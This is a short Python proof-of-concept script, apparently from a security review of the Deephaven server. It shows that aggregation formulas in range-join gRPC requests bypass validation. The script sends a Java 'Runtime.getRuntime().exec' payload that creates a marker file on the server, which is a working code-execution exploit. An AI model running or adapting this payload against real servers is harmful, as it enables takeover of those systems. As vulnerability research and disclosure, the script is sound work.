"""
PoC for Gap 4: RangeJoinGrpcImpl — aggregation formulas not validated.

Aggregations in the RangeJoinTablesRequest are adapted via AggregationAdapter::adapt
and passed directly to leftTable.rangeJoin() with no ColumnExpressionValidator check.

Preconditions:
  - A Deephaven server running on localhost:10000
  - A table "t" exists in the global scope (e.g. t = emptyTable(1).update("i = 1"))
"""

from pydeephaven import Session
from pydeephaven.agg import formula
from deephaven_core.proto import table_pb2, table_pb2_grpc


def main():
    session = Session(host="localhost", port=10000)
    try:
        t = session.open_table("t")
        print(f"Opened table 't', size={t.size}")

        stub = table_pb2_grpc.TableServiceStub(session.grpc_channel)

        # formula() with formula_param produces an _AggregationColumns with AggSpecFormula.
        # The range join path never validates aggregation formulas.
        payload = 'Runtime.getRuntime().exec("touch /tmp/pwned-gap4")'
        agg = formula(formula=payload, formula_param="garbage", cols="I")

        result_ticket = session.make_export_ticket()
        request = table_pb2.RangeJoinTablesRequest(
            result_id=result_ticket.pb_ticket,
            left_id=table_pb2.TableReference(ticket=t.ticket.pb_ticket),
            right_id=table_pb2.TableReference(ticket=t.ticket.pb_ticket),
            exact_match_columns=[],
            range_match="A < B < C",
            aggregations=[agg.make_grpc_message()],
        )

        try:
            response = session.wrap_rpc(stub.RangeJoinTables, request)
            print(f"RangeJoin succeeded, size={response.size}")
        except Exception as e:
            print(f"RangeJoin failed: {e}")

        print()
        print("Check: does /tmp/pwned-gap4 exist on the server?")
        print("  ls -la /tmp/pwned-gap4")
    finally:
        session.close()


if __name__ == "__main__":
    main()

